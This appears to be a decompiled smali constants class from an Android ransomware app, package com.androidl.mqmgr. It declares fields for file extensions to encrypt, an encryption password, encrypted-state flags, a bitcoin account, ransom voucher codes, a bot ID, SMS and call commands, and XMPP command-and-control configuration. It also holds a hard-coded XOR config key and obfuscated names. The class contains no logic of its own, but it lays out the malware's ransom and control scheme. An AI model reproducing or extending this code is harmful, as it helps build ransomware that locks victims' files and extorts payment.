.class public Lcom/androidl/mqmgr/Constants;
.super Ljava/lang/Object;
.source "Constants.java"


# static fields
.field public static ADMIN_ACCESS_MESSAGE:Ljava/lang/String; = null

.field public static AFFILIATE_ID:Ljava/lang/String; = null

.field public static BAD_FILENAMES:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static BITCOIN_ACCOUNT:Ljava/lang/String; = null

.field public static BOT_ID:Ljava/lang/String; = null

.field public static BUILD_ID:Ljava/lang/String; = null

.field public static BUILTIN_JID_CONFIG:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static COMMAND_BITCOIN_ACCOUNT:Ljava/lang/String; = null

.field public static COMMAND_BOT_ID:Ljava/lang/String; = null

.field public static COMMAND_CALL:Ljava/lang/String; = null

.field public static COMMAND_DECRYPT:Ljava/lang/String; = null

.field public static COMMAND_ENCRYPT:Ljava/lang/String; = null

.field public static COMMAND_HELLO:Ljava/lang/String; = null

.field public static COMMAND_JID_CONFIG:Ljava/lang/String; = null

.field public static COMMAND_PASSWORD:Ljava/lang/String; = null

.field public static COMMAND_SECRET:Ljava/lang/String; = null

.field public static COMMAND_SERVER_MESSAGES:Ljava/lang/String; = null

.field public static COMMAND_SMS:Ljava/lang/String; = null

.field public static COMMAND_VOUCHER_MESSAGE:Ljava/lang/String; = null

.field public static final CONFIG_NAME:Ljava/lang/String; = "akdifoa"

.field public static final CONFIG_XOR_KEY:Ljava/lang/String; = "wrmpwubjhemff"

.field public static final DEBUG_TAG:Ljava/lang/String; = "jblkpaolor"

.field public static ENCODED_FILE_EXTENSION:Ljava/lang/String; = null

.field public static ENCRYPT_PASSWORD:Ljava/lang/String; = null

.field public static EXTENSIONS_TO_ENCRYPT:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static FILES_WERE_DECRYPTED:Z = false

.field public static FILES_WERE_ENCRYPTED:Z = false

.field public static INVALID_VOUCHER_MASKS:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static final POLLING_TIME_MINUTES:I = 0x96

.field public static final PREFS_NAME:Ljava/lang/String; = "qlcwhudkvvk"

.field public static PRIVATE_JID_CONFIG:Ljava/util/List; = null
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public static PRIVATE_PASSWORD:Ljava/lang/String; = null

.field public static PUBLIC_PASSWORD:Ljava/lang/String; = null

.field public static READY_FOR_DECRYPTION:Z = false

.field public static final RELOADIT_DIGITS_NUMBER:I = 0xa

.field public static SUCCESS_JID_CONFIG:Ljava/lang/String;

.field public static THREAD_ID:Ljava/lang/String;

.field public static VOUCHER_CODE:Ljava/lang/String;

.field public static VOUCHER_ERROR_MESSAGE:Ljava/lang/String;

.field public static VOUCHER_TYPE:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const/4 v0, 0x0

    const/4 v1, 0x0

    .line 9
    sput-boolean v0, Lcom/androidl/mqmgr/Constants;->FILES_WERE_DECRYPTED:Z

    .line 11
    sput-object v1, Lcom/androidl/mqmgr/Constants;->VOUCHER_TYPE:Ljava/lang/String;

    .line 12
    sput-object v1, Lcom/androidl/mqmgr/Constants;->BOT_ID:Ljava/lang/String;

    .line 14
    sput-object v1, Lcom/androidl/mqmgr/Constants;->VOUCHER_CODE:Ljava/lang/String;

    .line 16
    sput-object v1, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    .line 24
    sput-object v1, Lcom/androidl/mqmgr/Constants;->BITCOIN_ACCOUNT:Ljava/lang/String;

    .line 25
    sput-boolean v0, Lcom/androidl/mqmgr/Constants;->FILES_WERE_ENCRYPTED:Z

    .line 28
    sput-boolean v0, Lcom/androidl/mqmgr/Constants;->READY_FOR_DECRYPTION:Z

    .line 31
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androidl/mqmgr/Constants;->EXTENSIONS_TO_ENCRYPT:Ljava/util/List;

    .line 32
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androidl/mqmgr/Constants;->PRIVATE_JID_CONFIG:Ljava/util/List;

    .line 36
    sput-object v1, Lcom/androidl/mqmgr/Constants;->VOUCHER_ERROR_MESSAGE:Ljava/lang/String;

    .line 38
    sput-object v1, Lcom/androidl/mqmgr/Constants;->PRIVATE_PASSWORD:Ljava/lang/String;

    .line 41
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androidl/mqmgr/Constants;->BUILTIN_JID_CONFIG:Ljava/util/List;

    .line 42
    sput-object v1, Lcom/androidl/mqmgr/Constants;->SUCCESS_JID_CONFIG:Ljava/lang/String;

    .line 43
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androidl/mqmgr/Constants;->INVALID_VOUCHER_MASKS:Ljava/util/List;

    .line 49
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lcom/androidl/mqmgr/Constants;->BAD_FILENAMES:Ljava/util/List;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method
